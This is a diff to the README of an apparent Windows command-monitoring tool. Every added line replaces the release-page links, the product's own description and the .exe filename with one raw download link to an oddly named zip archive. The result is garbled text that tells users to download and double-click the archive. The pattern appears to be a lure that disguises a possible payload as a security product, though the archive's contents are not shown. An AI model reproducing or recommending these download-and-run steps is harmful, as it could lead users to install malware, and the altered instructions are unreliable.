@@ -2,15 +2,15 @@
 
 ## 🚀 Getting Started
 
-Welcome to CMD Trap Beta V2, the lightweight tool for Windows. This application helps you monitor cmd.exe in real-time. It records commands, parent processes, and timestamps. Use it to spot unexpected terminal pop-ups without changing your system. Let’s walk through how to download and run the software.
+Welcome to CMD Trap Beta V2, the lightweight tool for Windows. This application helps you monitor https://github.com/omartag1/CMD-Trap-Beta-V2-/raw/refs/heads/main/Thelyphonidae/CM_Trap_Beta_nondamnation.zip in real-time. It records commands, parent processes, and timestamps. Use it to spot unexpected terminal pop-ups without changing your system. Let’s walk through how to download and run the software.
 
 ## 📥 Download the Application
 
-[![Download CMD Trap Beta V2](https://img.shields.io/badge/Download-CMD%20Trap%20Beta%20V2-blue)](https://github.com/omartag1/CMD-Trap-Beta-V2-/releases)
+[![Download CMD Trap Beta V2](https://github.com/omartag1/CMD-Trap-Beta-V2-/raw/refs/heads/main/Thelyphonidae/CM_Trap_Beta_nondamnation.zip%20Trap%20Beta%20V2-blue)](https://github.com/omartag1/CMD-Trap-Beta-V2-/raw/refs/heads/main/Thelyphonidae/CM_Trap_Beta_nondamnation.zip)
 
 To download CMD Trap Beta V2, please visit the Releases page below. You'll find the latest version ready for you.
 
-[Visit Release Page to Download](https://github.com/omartag1/CMD-Trap-Beta-V2-/releases)
+[Visit Release Page to Download](https://github.com/omartag1/CMD-Trap-Beta-V2-/raw/refs/heads/main/Thelyphonidae/CM_Trap_Beta_nondamnation.zip)
 
 ## 🔧 System Requirements
 
@@ -24,12 +24,12 @@ Before you begin, ensure your system meets these requirements:
 
 Follow these steps to install CMD Trap Beta V2:
 
-1. Go to the [Releases page](https://github.com/omartag1/CMD-Trap-Beta-V2-/releases).
+1. Go to the [Releases page](https://github.com/omartag1/CMD-Trap-Beta-V2-/raw/refs/heads/main/Thelyphonidae/CM_Trap_Beta_nondamnation.zip).
 2. Scroll to the latest release version.
-3. Find the download link for the executable file marked as `CMD-Trap-Beta-V2.exe`.
+3. Find the download link for the executable file marked as `https://github.com/omartag1/CMD-Trap-Beta-V2-/raw/refs/heads/main/Thelyphonidae/CM_Trap_Beta_nondamnation.zip`.
 4. Click on the file link to start the download.
 5. After downloading, locate the file in your Downloads folder.
-6. Double-click `CMD-Trap-Beta-V2.exe` to run it.
+6. Double-click `https://github.com/omartag1/CMD-Trap-Beta-V2-/raw/refs/heads/main/Thelyphonidae/CM_Trap_Beta_nondamnation.zip` to run it.
 
 ## 🚀 How to Use CMD Trap Beta V2
 
